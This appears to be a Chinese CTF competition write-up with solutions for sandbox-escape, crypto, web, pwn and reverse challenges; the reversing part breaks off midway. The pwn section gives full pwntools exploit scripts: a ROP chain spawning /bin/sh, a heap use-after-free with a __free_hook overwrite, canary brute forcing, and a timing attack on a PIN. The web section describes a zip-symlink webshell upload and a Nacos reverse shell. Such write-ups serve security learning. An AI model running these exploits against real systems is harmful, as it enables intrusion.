<img src="https://img.hzy2003628.top/m6jum804mg.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>经过反复测试以及报错 得出执行的语句长度必须小于8位，并且字符也占位数</p>
<p>Python环境下列出根目录的命令为__import__(‘os’).system(‘ls /’)，由此可推出，执行命令必须使用拼接的手法</p>
<pre><code class="hljs plaintext">\&gt;&gt;&#x27;__imp&#x27;

&#x27;__imp&#x27;

\&gt;&gt;_+&quot;&#x27;)&quot;

&quot;__imp&#x27;)&quot;

\&gt;&gt;&#x27;__imp&#x27;

&#x27;__imp&#x27;

\&gt;&gt;_+&#x27;ort&#x27;

&#x27;__import&#x27;

\&gt;&gt;_+&#x27;__(&#x27;

&#x27;__import__(&#x27;

\&gt;&gt;_+&quot;&#x27;os&quot;

&quot;__import__(&#x27;os&quot;

\&gt;&gt;_+&quot;&#x27;)&quot;

&quot;__import__(&#x27;os&#x27;)&quot;

\&gt;&gt;_+&quot;.s&quot;

&quot;__import__(&#x27;os&#x27;).s&quot;

\&gt;&gt;_+&quot;ys&quot;

&quot;__import__(&#x27;os&#x27;).sys&quot;

\&gt;&gt;_+&quot;te&quot;

&quot;__import__(&#x27;os&#x27;).syste&quot;

\&gt;&gt;_+&quot;m(&quot;

&quot;__import__(&#x27;os&#x27;).system(&quot;

\&gt;&gt;_+&quot;&#x27;l&quot;

&quot;__import__(&#x27;os&#x27;).system(&#x27;l&quot;

\&gt;&gt;_+&quot;s&#x27;&quot;

&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;&quot;

\&gt;&gt;_+&quot;)&quot;

&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;

\&gt;&gt;eval(_)</code></pre>
<p>列出了根目录，并找到了flag</p>
<img src="https://img.hzy2003628.top/unk6uculed.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>接着拼接__import__(‘os’).system(‘cat /flag’)命令来获得flag</p>
<pre><code class="hljs plaintext">\&gt;&gt;&#x27;__imp&#x27;

&#x27;__imp&#x27;

\&gt;&gt;_+&#x27;ort&#x27;

&#x27;__import&#x27;

\&gt;&gt;_+&#x27;__(&#x27;

&#x27;__import__(&#x27;

\&gt;&gt;_+&quot;&#x27;os&quot;

&quot;__import__(&#x27;os&quot;

\&gt;&gt;_+&quot;&#x27;)&quot;

&quot;__import__(&#x27;os&#x27;)&quot;

\&gt;&gt;_+&quot;.s&quot;

&quot;__import__(&#x27;os&#x27;).s&quot;

\&gt;&gt;_+&quot;ys&quot;

&quot;__import__(&#x27;os&#x27;).sys&quot;

\&gt;&gt;_+&quot;te&quot;

&quot;__import__(&#x27;os&#x27;).syste&quot;

\&gt;&gt;_+&quot;m(&quot;

&quot;__import__(&#x27;os&#x27;).system(&quot;

\&gt;&gt;_+&quot;&#x27;c&quot;

&quot;__import__(&#x27;os&#x27;).system(&#x27;c&quot;

\&gt;&gt;_+&#x27;at &#x27;

&quot;__import__(&#x27;os&#x27;).system(&#x27;cat &quot;

\&gt;&gt;_+&#x27;/fl&#x27;

&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /fl&quot;

\&gt;&gt;_+&quot;ag&quot;

&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&quot;

\&gt;&gt;_+&quot;&#x27;)&quot;

&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;)&quot;

\&gt;&gt;eval(_)</code></pre>
<img src="https://img.hzy2003628.top/24txjjxodk.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{d787c579-1639-4934-ad12-54349bab5581}</p>
<h2 id="crypto">CRYPTO</h2>
<h3 id="基于国密sm2算法的密钥密文分发">基于国密SM2算法的密钥密文分发</h3>
<p>题目附件就是步骤，跟着走就行</p>
<p>先登录身份获取id</p>
<img src="https://img.hzy2003628.top/wisqu8386c.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>然后传自己的公钥，来获取私钥</p>
<img src="https://img.hzy2003628.top/gblq50xh49.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>Search一下获取全部信息</p>
<img src="https://img.hzy2003628.top/54hzmehq7t.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>然后利用sm2在线解密得到密文解密的内容</p>
<p>8E 94 6E CB 28 F3 47 58 F6 4F 2F 71 04 16 66 8F</p>
<img src="https://img.hzy2003628.top/ety2bg35rf.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>传进去进行验证，验证成功得到flag</p>
<img src="https://img.hzy2003628.top/m08fpqpxfw.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{b0ac8c99-bd3d-44a5-9f76-61fa0595f50f}</p>
<h3 id="可信度量">可信度量</h3>
<p>非预期，直接全局搜索flag{数据和environ文件即可得到flag。</p>
<img src="https://img.hzy2003628.top/jib2qnoooz.png" alt="请在此添加图片描述" style="zoom:200%;">
<h3 id="sign_in_passwd">Sign_in_passwd</h3>
<p>Base64换表，脚本没跑成，找了个在线网站。</p>
<img src="https://img.hzy2003628.top/6ophxjgeyk.png" alt="请在此添加图片描述" style="zoom:200%;">
<h2 id="web">WEB</h2>
<h3 id="unzip">Unzip</h3>
<p>2021深育杯原题zipzip，跟着走即可。</p>
<p><a href="https://xz.aliyun.com/t/10533#toc-4">2021深育杯线上初赛官方WriteUp - 先知社区 (aliyun.com)</a></p>
<p>生成两个压缩包，一个是软链接，一个是恶意木马。</p>
<img src="https://img.hzy2003628.top/ginccfyf8g.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>然后先传入软链接再传入恶意木马，即可写入shell。</p>
<img src="https://img.hzy2003628.top/e55hbrn5zm.png" alt="请在此添加图片描述" style="zoom:200%;">
<h3 id="dumpit">Dumpit</h3>
<p>db参数存在注入，%0a闭合存在命令执行，应该是非预期了</p>
<img src="https://img.hzy2003628.top/zdl5rxazhn.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>Printenv</p>
<p>看环境变量得到flag</p>
<img src="https://img.hzy2003628.top/i38ybay93a.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{3276d3e9-5061-4375-8171-f3ded5697565}</p>
<h3 id="backendservice">BackendService</h3>
<p>首先发现是nacos框架，一个登录框，网上发现了任意用户注册和管理员密码修改。</p>
<p><a href="https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270">(1条消息) NACOS漏洞问题及修复(CVE-2021-29441)_老板请吃饭的博客-CSDN博客</a></p>
<p>注册用户或者修改管理员用户，然后登录。</p>
<img src="https://img.hzy2003628.top/556aqkjiaa.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>又发现了一个CVE。</p>
<p><a href="https://xz.aliyun.com/t/11493#toc-4">https://xz.aliyun.com/t/11493#toc-4</a></p>
<p>刚开始直接打没成，之后在下边发现该配置变了，在这里发现了name和格式，需要用json格式发送。</p>
<img src="https://img.hzy2003628.top/pcvxs8r4gf.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>反弹shell。</p>
<img src="https://img.hzy2003628.top/btal7vovo0.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>然后读取flag。</p>
<img src="https://img.hzy2003628.top/wg5m40c4vv.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{ea59c9d3-96c8-494c-b3d3-71e3bd21ce74}</p>
<h2 id="pwn">PWN</h2>
<h3 id="烧烤摊儿">烧烤摊儿</h3>
<p>运行程序</p>
<img src="https://img.hzy2003628.top/33njg79s1j.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>猜测程序中的puts函数</p>
<img src="https://img.hzy2003628.top/c56yz6nw1t.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>大致猜测应该就是输入买啤酒，然后输入几瓶，再从钱里面扣，输入负数，即可让钱增长，增长之后，即可买摊位</p>
<img src="https://img.hzy2003628.top/7h3lru4vcx.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>买完之后能改名，改名函数存在栈溢出，用工具生成payload</p>
<p>然后调试的到偏移，</p>
<p>Exp如下：</p>
<pre><code class="hljs plaintext">from pwn import *

from struct import pack

from LibcSearcher import *

context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)

io=remote(&quot;112.126.80.123&quot;,26771)

\#io=process(&quot;./pwn&quot;)

\#libc=ELF(&quot;./libc32-2.27.so&quot;)

elf=ELF(&quot;./pwn&quot;)

io.sendline(str(1))

io.sendline(str(1))

io.sendline(str(-100000))

io.sendline(str(4))

io.sendline(str(5))

p = b&#x27;a&#x27;*(0x20)+b&#x27;bcdefjhi&#x27;

p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000458827) # pop rax ; ret

p += b&#x27;/bin//sh&#x27;

p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x000000000040264f) # pop rdi ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data

p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8

p += pack(&#x27;&lt;Q&#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8

p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # padding

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret

p += pack(&#x27;&lt;Q&#x27;, 0x0000000000402404) # syscall

\#gdb.attach(io)

\#pause()

io.sendline(p)

io.interactive()</code></pre>
<img src="https://img.hzy2003628.top/8cxh9bteek.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{86bf0ad1-12e1-48eb-9b39-ac77eb74510c}</p>
<h3 id="strangetalkbot">StrangeTalkBot</h3>
<p>先看一眼保护</p>
<img src="https://img.hzy2003628.top/kpayg8i7py.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>丢进64位ida查看</p>
<img src="https://img.hzy2003628.top/qyf33vimac.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>输入一个0x400字节的数据存到了bss段里面</p>
<p>这个函数对输入的数据进行了一些操作，函数里面的代码太杂了，没看懂</p>
<img src="https://img.hzy2003628.top/wb1dzfimiq.png" alt="请在此添加图片描述" style="zoom:200%;">
<img src="https://img.hzy2003628.top/o86vbvgviz.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>学逆向的队友告诉我这个有可能是个加密，他说像probuf协议加密</p>
<p>队友给我装了个环境，</p>
<p>sudo apt-get install protobuf-compiler</p>
<p>但是还需要有协议词，在程序里找找</p>
<img src="https://img.hzy2003628.top/8q89qm0vjk.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>应该就是这四个了</p>
<p>创建一个文件名为output_directory 文件夹 和 devicmesg.proto 文件</p>
<p>devicmesg.proto 文件放入以下代码</p>
<p>syntax = “proto3”;</p>
<p>package pack.base;</p>
<p>message devicmesg {</p>
<p>sint32 actionid = 1;</p>
<p>sint32 msgidx = 2;</p>
<p>sint32 msgsize = 3;</p>
<p>bytes msgcontent = 4;</p>
<p>}</p>
<p>编译一下</p>
<p>protoc --python_out=./output ./devicmesg.proto</p>
<img src="https://img.hzy2003628.top/ohqb8rgxze.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>然后就能看下面的内容了</p>
<img src="https://img.hzy2003628.top/tkv9qebv0j.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>增删查改功能齐全，找一下漏洞，发现</p>
<img src="https://img.hzy2003628.top/uosu97o3jg.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>这里的置零不是指针置零，所以这个存在uaf漏洞</p>
<p>2.31的uaf漏洞，有沙盒存在</p>
<img src="https://img.hzy2003628.top/9je7z1kk77.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>能用orw，那就用mov_rdx_rdi_配合setcontext函数进行orw读flag了</p>
<img src="https://img.hzy2003628.top/8lzurk3nd9.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>Exp：</p>
<pre><code class="hljs plaintext">from pwn import *

from struct import pack

from ctypes import *

def s(a):

p.send(a)

def sa(a, b):

p.sendafter(a, b)

def sl(a):

p.sendline(a)

def sla(a, b):

p.sendlineafter(a, b)

def r():

p.recv()

def pr():

print(p.recv())

def rl(a):

return p.recvuntil(a)

def inter():

p.interactive()

def debug():

gdb.attach(p)

pause()

def get_addr():

return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))

def get_sb():

return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))

context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)

\#p = process(&quot;./pwn2&quot;)

p = remote(&#x27;47.94.206.10&#x27;, 34904)elf = ELF(&quot;./pwn2&quot;)

libc = ELF(&#x27;./libc-2.31.so&#x27;)

import sys

sys.path.append(&#x27;./output&#x27;)

import devicmesg_pb2

def add(idx, data_len, data):

msg = devicmesg_pb2.devicmesg()

msg.actionid = 1

msg.msgidx = idx

msg.msgsize = data_len

msg.msgcontent = data

serialized_msg = msg.SerializeToString()

sa(b&#x27;now: \n&#x27;, serialized_msg)

def edit(idx, data):

msg = devicmesg_pb2.devicmesg()

msg.actionid = 2

msg.msgidx = idx

msg.msgsize = 1

msg.msgcontent = data

serialized_msg = msg.SerializeToString()

sa(b&#x27;now: \n&#x27;, serialized_msg)

def show(idx):

msg = devicmesg_pb2.devicmesg()

msg.actionid = 3

msg.msgidx = idx

msg.msgsize = 1

msg.msgcontent = b&#x27;a&#x27;

serialized_msg = msg.SerializeToString()

sa(b&#x27;now: \n&#x27;, serialized_msg)

def free(idx):

msg = devicmesg_pb2.devicmesg()

msg.actionid = 4

msg.msgidx = idx

msg.msgsize = 1

msg.msgcontent = b&#x27;a&#x27;

serialized_msg = msg.SerializeToString()

sa(b&#x27;now: \n&#x27;, serialized_msg)

for i in range(1, 10):

add(i, 0xf0, b&#x27;a&#x27;*0xf0)

for i in range(1, 9):

free(i)

show(8)

p.recv(0x38)

heap_base = u64(p.recv(8)) - 0x1470

rl(b&#x27;\x7f&#x27;)

libc_base = get_addr() - 0x1ecbe0 #

rax = libc_base + 0x36174

rdi = libc_base + 0x23b6a

rsi = libc_base + 0x2601f

rdx = libc_base + 0x142c92

rsp = libc_base + 0x2f70a

ret = libc_base + 0x22679

syscall = libc_base + 0x2284d

mov_rdx_rdi_ = libc_base + 0x151990

setcontext = libc_base + 0x54F5D

buf = heap_base + 0x3000

flag = heap_base + 0x2088

free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]

add(10, 0x20, b&#x27;a&#x27;)

add(11, 0x20, b&#x27;a&#x27;)

free(11)

free(10)

edit(10, p64(free_hook - 8))

add(12, 0x20, b&#x27;a&#x27;)

payload = b&#x27;\x00&#x27;*8 + p64(mov_rdx_rdi_)

add(13, 0x20, payload)

add(14, 0xc0, (p64(heap_base + 0x1e20)*2 + p64(setcontext)*4).ljust(0xa0, b&#x27;\x00&#x27;) + p64(heap_base + 0x640) + p64(ret))

open_ = libc_base + libc.sym[&#x27;open&#x27;]

read = libc_base + libc.sym[&#x27;read&#x27;]

write = libc_base + libc.sym[&#x27;write&#x27;]

puts = libc_base + libc.sym[&#x27;puts&#x27;]

orw = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(open_)

orw += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx) + p64(0x30) + p64(read)

orw += p64(rdi) + p64(1) + p64(write)

orw += b&#x27;/flag\x00\x00\x00&#x27;

edit(2, orw)

free(14)

pr()</code></pre>
<p>读取到flag即可</p>
<img src="https://img.hzy2003628.top/6ihw75zn4g.png" alt="请在此添加图片描述" style="zoom:200%;">
<h3 id="funcanary">Funcanary</h3>
<p>生成子进程，然后主进程阻塞，子进程进行输入函数</p>
<img src="https://img.hzy2003628.top/0evq6d47jl.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>存在栈溢出但是保护全开</p>
<img src="https://img.hzy2003628.top/gjg2ck2fw5.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>有后门函数，但是开启了地址随机化</p>
<p>因此思路就是一字节一字节的爆破canary，返回地址后三位相同，所以爆破一下后四位就行</p>
<p>网上有现成exp，稍改一下</p>
<p>Exp如下：（python2）</p>
<pre><code class="hljs plaintext">from pwn import *

context.log_level = &#x27;debug&#x27;

context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;bash&#x27;,&#x27;-c&#x27;]

context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)

local = 0

elf = ELF(&#x27;./pwn1&#x27;)

if local:

p = process(&#x27;./pwn1&#x27;)

\#libc = elf.libc

else:

p = remote(&#x27;123.56.99.60&#x27;,31516)

libc = ELF(&#x27;./pwn1&#x27;)

p.recvuntil(&#x27;welcome\n&#x27;)

canary = &#x27;\x00&#x27;

for k in range(7):

for i in range(256):

print (&quot;the &quot; + str(k) + &quot;: &quot; + chr(i))

p.send(&#x27;a&#x27;*(0x70-8) + canary + chr(i))

a = p.recvuntil(&quot;welcome\n&quot;)

print (a)

if &quot;have fun&quot; in a:

canary += chr(i)

print (&quot;canary: &quot; + canary)

break

for i in range(16):

a = 0x10 * i + 0x2

pay = &#x27;a&#x27;*0x68 + canary + &quot;a&quot;*8 + &quot;\x31&quot; + chr(a)

print(pay)

\#debug()

p.send(pay)

out = p.recvuntil(&quot;welcome\n&quot;)

print(out)

if b&quot;&#123;&quot; in out:

success(out)

print(out)

break

p.interactive()</code></pre>
<img src="https://img.hzy2003628.top/au5j91uod5.png" alt="请在此添加图片描述" style="zoom:200%;">
<h3 id="login">Login</h3>
<p>这个题目有点脑洞，没有附件的pwn题，不过我向来爱猜，也是拿到了这个题目的一血</p>
<p>连上靶机之后</p>
<img src="https://img.hzy2003628.top/zng2ojrauv.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>分别输入123看一下功能，第一时间想的是爆破密码，但是又不知道多少位，所以就想着出题人不可能这样出，看到3的8位pin code，就上网搜了一下，发现pin code 一般都是数字组成，这个就相当于一种令牌，但是穷举有将近1个亿的数据，所以换个思路，在网上漫游的时候，发现了一个测信道攻击，并且之前做到过，问了chatgpt</p>
<p>这个问题涉及到一个基于时间的信道攻击，常见于密码学中的侧信道攻击。</p>
<p>在爆破一个PIN值时，可以通过观察时间戳的差异来判断每一位是否正确。这种攻击基于以下原理：</p>
<blockquote>
<p>时间差异：当输入的PIN值的某一位与正确PIN值的对应位不同时，可能会导致系统的某些操作或计算需要更多的时间。例如，当输入的PIN值的某一位与正确PIN值的对应位不匹配时，系统可能需要执行更多的比较操作或者条件判断，导致所需的时间更长。</p>
<p>侧信道分析：通过观察时间戳的差异，攻击者可以推断出某一位是否正确。如果时间戳的差异明显大于其他位，那么很可能是因为该位的值不正确，导致了额外的计算时间。攻击者可以利用这种侧信道信息，逐位爆破出正确的PIN值。</p>
</blockquote>
<p>需要注意的是，这种攻击方法依赖于时间差异的可观察性。在一些情况下，系统可能会采取措施来减少时间差异，以防止此类侧信道攻击。因此，在实际应用中，为了提高安全性，可以采取一些对策，如增加随机延迟、固定执行时间等，来混淆时间差异，使得侧信道攻击更加困难。</p>
<p>所以准备采用时间戳来一位一位的爆破</p>
<p>Exp</p>
<pre><code class="hljs plaintext">from pwn import *

from sys import argv

context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)

def s(a):

p.send(a)

def sa(a, b):

p.sendafter(a, b)

def sl(a):

p.sendline(a)

def sla(a, b):

p.sendlineafter(a, b)

def r():

p.recv()

def pr():

print(p.recv())

def ru(a):

return p.recvuntil(a)

def inter():

p.interactive()

def debug():

gdb.attach(p)

pause()

def get_addr():

return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))

def get_sb():

return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))

pin=&#x27;8&#x27;

a=&#x27;0&#x27;

p= remote(&quot;47.94.206.10&quot;,33355)

pin_o = pin+a+&#x27;0&#x27;*(7-len(pin))

sum=0

for _ in range(10): #发十次增大数据之间相比较的时间戳值

ru(&#x27;&gt;&#x27;)

sl(b&#x27;3&#x27;)

ru(b&quot;PIN code: &quot;)

start=time.time()

sl(pin_o)

rev=ru(b&#x27;\n&#x27;)

if b&quot;Wrong PIN code&quot; in rev:

pass

else:

print(pin_0)

break

end=time.time()

sum+=(end-start)

print(pin_o,sum)

p.interactive()</code></pre>
<img src="https://img.hzy2003628.top/kpx00vmbgh.png" alt="请在此添加图片描述" style="zoom:200%;">
<img src="https://img.hzy2003628.top/b8mvdi0psx.png" alt="请在此添加图片描述" style="zoom:200%;">
<img src="https://img.hzy2003628.top/4pdi6cef19.png" alt="请在此添加图片描述" style="zoom:200%;">
<img src="https://img.hzy2003628.top/h1uc3kawi6.png" alt="请在此添加图片描述" style="zoom:200%;">
<img src="https://img.hzy2003628.top/m3u6igk39i.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>图片太多了，就不一一粘贴了</p>
<p>可以看到每一位的时间戳都有差距，但是50000000时，时间戳明显增大</p>
<p>所以猜测，这个第一位应该就是5，以此类推逐渐爆破出每一位</p>
<p>最后爆出来是pin code为 54730891</p>
<img src="https://img.hzy2003628.top/k6vjrlrv11.png" alt="请在此添加图片描述" style="zoom:200%;">
<h2 id="reverse">REVERSE</h2>
<h3 id="ezbyte">ezbyte</h3>
<p>找到程序主函数</p>
<img src="https://img.hzy2003628.top/16z5vm810j.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>这个read和puts函数是通过分析程序，以及运行程序大致猜到的。</p>
<p>输入字符，然后经过一系列函数，开始分析函数</p>
<img src="https://img.hzy2003628.top/4bcdecwmuq.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>这个函数有两个参数，跟进分析一下</p>
<img src="https://img.hzy2003628.top/yi2g28oqmj.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>经过调试，发现v2的值为a2的长度，所以猜测这个函数是strlen函数</p>
<p>Puts函数是自己定义的，因为调试的时候，发现运行完这个函数，程序就打印了自己输入的东西（里面有的东西没看懂在干什么）</p>
<img src="https://img.hzy2003628.top/41xtw87c11.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>抱着最后希望，看404c21函数，跟进一下</p>
<img src="https://img.hzy2003628.top/scdl9dze4e.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>发现这个函数会检测输入的flag，是否为这个格式并且提供了一点flag的信息</p>
<p>然后程序就会进入到404bf4这个函数，跟进一下</p>
<img src="https://img.hzy2003628.top/3cq8hktu9u.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>再看一下404bf6</p>
<img src="https://img.hzy2003628.top/6yp0o9kpsd.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>跳转到这，猜测应该是跳转到404bf9处了（）</p>
<p>此处反编译不了，在根据题目名猜测和字节码有关</p>
<p>经过查询之后，发现了readelf -w ezbyte会生成字节码的形式，</p>
<p>但是也发现不了什么信息，</p>
<p>在网上寻找信息的时候，找到了一篇文章（找不到哪一个了）</p>
<p>用</p>
<p>readelf --debug-dump=frames ezbyte &gt;a.txt指令生成一个了一个字节码的文件</p>
<img src="https://img.hzy2003628.top/sgl5s5iytc.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>但是没看懂是啥意思</p>
<p>然后我用英文版的ida反编译的时候，发现，同样这个检测flag的函数，居然反编译的和中文版的不一样，这个是说对flag字符串进行了赋值</p>
<p>并且赋值的变量存储在</p>
<img src="https://img.hzy2003628.top/fv6cdj85zw.png" alt="请在此添加图片描述" style="zoom:200%;">
